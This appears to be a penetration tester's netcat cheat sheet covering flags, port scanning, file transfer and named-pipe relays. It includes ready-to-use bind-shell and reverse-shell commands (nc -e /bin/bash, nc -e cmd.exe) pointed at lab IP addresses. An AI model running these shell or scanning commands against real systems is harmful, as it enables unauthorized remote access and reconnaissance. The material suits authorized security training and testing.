
Utility which reads and writes data across network connections, using TCP or UDP protocols.  
  
Server mode: Has the listener on it  
Client mode: ‘Dials’ into the server.  
  
We can use client mode to connect to any TCP/UDP port, allowing us  
	→ Check if a port is open or closed.  
	→ Read a banner from the service listening on a port.  
	→ Connect to a network service manually.  
  
  
If bind/ reverse bind won't properly execute binaries, verify whether it's a [fully interactive TTY](Fully%20Interactive%20TTY.md):
	Should see:
```bash
tty
	/dev/pts/0
```

  
  
  
**-e** - Executes a command after making or receiving a successful connection.  
	- Not available on most modern Linux/BSD systems  
	- Included w/ Kali  
	- When enabled, can redirect the input, output, and error messages of an executable to a TCP/UDP port (ex: bind shell)  
**-l** - Create a listener  
**-C** - Send CarriageReturn LineFeed (usefull when connecting via SMTP)  
**-n** - Skip DNS name resolution  
**-p** - Specify port number  
**-u** - UDP mode  
**-v** - Verbose mode  
**-w** - Specify connection timeout in seconds  
**-z** - Specifies zero-I/O mode. Used for scanning and sends no data.  
  
**nc -l** _port_ **>** _file_ - Redirect output to _file_  
**nc <** _file_ - Pushes _file_  
  
  
Bind Shells:  
```bash
nc -lvp 2222 -e cmd.exe  
nc -lvp 2222 -e /bin/bash
```


Reverse bind:  
```bash
nc -nv 10.10.10.1 -e cmd.exe  
nc -nv 10.10.10.1 -e /bin/bash
```


TCP scanning:  
```bash
nc -nvv -w 1 -z 10.11.1.220 3388-3390
```


UDP scanning:  
```bash
nc -nv -u -z -w 1 10.11.1.115 160-162
```


Transfer files from:  
```bash
nc -w 3 [destination] [port] < out.file
```


Transfer files to:  
```bash
nc -nlvp [port] > in.file
```

 
Named pipes:  
```bash
mknod [pipe] p; nc -l -p [port] < [pipe] | nc [ip] [new_port] > [pipe]
```